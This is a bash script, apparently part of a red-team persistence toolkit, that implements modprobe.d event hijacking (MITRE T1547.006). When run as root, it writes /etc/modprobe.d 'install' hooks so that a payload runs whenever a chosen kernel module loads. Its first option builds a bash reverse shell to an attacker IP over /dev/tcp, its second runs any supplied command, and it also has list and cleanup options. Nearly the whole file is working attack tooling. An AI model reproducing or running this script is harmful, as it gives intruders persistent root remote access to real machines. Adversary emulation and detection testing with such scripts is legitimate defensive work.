#!/bin/bash
#
# Modprobe.d Event Hijacking (T1547.006)
# Abuse /etc/modprobe.d/ 'install' directives to execute payloads
# when kernel auto-loads specific modules
# Source: PANIX
#

if [[ $(id -u) -ne 0 ]]; then
    echo "[ERROR] You must run this script as root" >&2
    exit 1
fi

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
MARKER="d3m0n_modprobe"
MODPROBE_DIR="/etc/modprobe.d"

echo -e "${CYAN}"
echo "  ╔═══════════════════════════════════════════════════════╗"
echo "  ║       Modprobe.d Event Hijacking (T1547.006)          ║"
echo "  ║   Payload runs when kernel auto-loads a module         ║"
echo "  ╚═══════════════════════════════════════════════════════╝"
echo -e "${NC}"

echo -e "  ${CYAN}[1]${NC} Install modprobe hook (reverse shell)"
echo -e "  ${CYAN}[2]${NC} Install modprobe hook (custom command)"
echo -e "  ${CYAN}[3]${NC} List common auto-loaded modules"
echo -e "  ${CYAN}[4]${NC} List installed hooks"
echo -e "  ${CYAN}[5]${NC} Cleanup"
echo ""
read -p "Choice [1-5]: " OPT

COMMON_MODULES=("usb-storage" "fuse" "nfs" "cifs" "vfat" "isofs" "ext4" "btrfs" "loop" "ppp_generic" "tun" "bridge" "bonding")

pick_module() {
    echo -e "${YELLOW}[?] Module to hook:${NC}"
    for i in "${!COMMON_MODULES[@]}"; do
        echo -e "  [$(( i + 1 ))] ${COMMON_MODULES[$i]}"
    done
    echo -e "  [0] Custom module name"
    read -p "Choice [1]: " MIDX
    MIDX="${MIDX:-1}"
    if [[ "$MIDX" == "0" ]]; then
        read -p "Module name: " MOD_NAME
    else
        MOD_NAME="${COMMON_MODULES[$(( MIDX - 1 ))]}"
    fi
}

case "$OPT" in
    1)
        pick_module
        read -p "Attacker IP: " LHOST
        read -p "Attacker Port: " LPORT
        PAYLOAD="/bin/bash -c 'nohup bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1 &'"

        CONF_FILE="${MODPROBE_DIR}/d3m0n-${MOD_NAME}.conf"
        REAL_MODPROBE=$(which modprobe 2>/dev/null || echo "/sbin/modprobe")

        cat > "$CONF_FILE" << EOF
# ${MARKER}
install ${MOD_NAME} ${PAYLOAD}; ${REAL_MODPROBE} --ignore-install ${MOD_NAME}
EOF

        echo -e "${GREEN}[+] Hook installed: ${CONF_FILE}${NC}"
        echo -e "${GREEN}[+] Module: ${MOD_NAME}${NC}"
        echo -e "${YELLOW}[*] Trigger: modprobe ${MOD_NAME} (or plug in USB for usb-storage)${NC}"
        ;;
    2)
        pick_module
        read -p "Command to execute: " CMD

        CONF_FILE="${MODPROBE_DIR}/d3m0n-${MOD_NAME}.conf"
        REAL_MODPROBE=$(which modprobe 2>/dev/null || echo "/sbin/modprobe")

        cat > "$CONF_FILE" << EOF
# ${MARKER}
install ${MOD_NAME} ${CMD}; ${REAL_MODPROBE} --ignore-install ${MOD_NAME}
EOF

        echo -e "${GREEN}[+] Hook installed: ${CONF_FILE}${NC}"
        echo -e "${GREEN}[+] Module: ${MOD_NAME}${NC}"
        ;;
    3)
        echo -e "${YELLOW}[*] Common auto-loaded modules:${NC}"
        for m in "${COMMON_MODULES[@]}"; do
            if lsmod | grep -q "^${m//-/_}"; then
                echo -e "  ${GREEN}[loaded]${NC}  $m"
            else
                echo -e "  ${YELLOW}[avail]${NC}  $m"
            fi
        done
        echo ""
        echo -e "${YELLOW}[*] Currently loaded modules: $(lsmod | wc -l) entries${NC}"
        ;;
    4)
        echo -e "${YELLOW}[*] Scanning ${MODPROBE_DIR}...${NC}"
        found=$(grep -rl "${MARKER}" "$MODPROBE_DIR" 2>/dev/null)
        if [[ -n "$found" ]]; then
            echo "$found" | while read -r f; do
                echo -e "  ${GREEN}$f:${NC}"
                cat "$f"
            done
        else
            echo -e "  ${YELLOW}No D3m0n modprobe hooks found${NC}"
        fi
        ;;
    5)
        echo -e "${YELLOW}[*] Removing D3m0n modprobe hooks...${NC}"
        grep -rl "${MARKER}" "$MODPROBE_DIR" 2>/dev/null | while read -r f; do
            echo -e "  Removing: $f"
            rm -f "$f"
        done
        echo -e "${GREEN}[+] Cleanup done${NC}"
        ;;
    *)
        echo "Invalid option"
        ;;
esac
